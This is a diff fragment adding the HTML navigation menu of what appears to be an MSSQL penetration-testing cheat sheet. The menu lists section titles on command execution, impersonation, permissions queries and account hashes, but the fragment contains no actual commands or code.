+            <li><a href="#execute-commands-using-ole-automation-procedures">Execute commands using OLE automation procedures</a></li>
+          </ul>
+        </li>
+        <li><a href="#agent-jobs">Agent Jobs</a>
+          <ul>
+            <li><a href="#execute-commands-through-sql-agent-job-service">Execute commands through SQL Agent Job service</a></li>
+            <li><a href="#list-all-jobs">List All Jobs</a></li>
+          </ul>
+        </li>
+        <li><a href="#external-scripts">External Scripts</a></li>
+        <li><a href="#python">Python:</a></li>
+        <li><a href="#r">R</a></li>
+        <li><a href="#audit-checks">Audit Checks</a>
+          <ul>
+            <li><a href="#find-and-exploit-impersonation-opportunities">Find and exploit impersonation opportunities</a></li>
+          </ul>
+        </li>
+        <li><a href="#find-databases-that-have-been-configured-as-trustworthy">Find databases that have been configured as trustworthy</a></li>
+        <li><a href="#manual-sql-server-queries">Manual SQL Server Queries</a>
+          <ul>
+            <li><a href="#query-current-user--determine-if-the-user-is-a-sysadmin">Query Current User &amp; determine if the user is a sysadmin</a></li>
+            <li><a href="#current-role">Current Role</a></li>
+            <li><a href="#current-db">Current DB</a></li>
+            <li><a href="#list-all-tables">List all tables</a></li>
+            <li><a href="#list-all-databases">List all databases</a></li>
+            <li><a href="#all-logins-on-server">All Logins on Server</a></li>
+            <li><a href="#all-database-users-for-a-database">All Database Users for a Database</a></li>
+            <li><a href="#list-all-sysadmins">List All Sysadmins</a></li>
+            <li><a href="#list-all-database-roles">List All Database Roles</a></li>
+            <li><a href="#effective-permissions-from-the-server">Effective Permissions from the Server</a></li>
+            <li><a href="#effective-permissions-from-the-database">Effective Permissions from the Database</a></li>
+            <li><a href="#find-sql-server-logins-which-can-be-impersonated-for-the-current-database">Find SQL Server Logins Which can be Impersonated for the Current Database</a></li>
+            <li><a href="#exploiting-impersonation">Exploiting Impersonation</a></li>
+            <li><a href="#exploiting-nested-impersonation">Exploiting Nested Impersonation</a></li>
+            <li><a href="#mssql-accounts-and-hashes">MSSQL Accounts and Hashes</a></li>
+          </ul>
+        </li>
+        <li><a href="#references">References</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+ 
+      </div>
+    </aside>
+    
+  </main>
+
+  
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
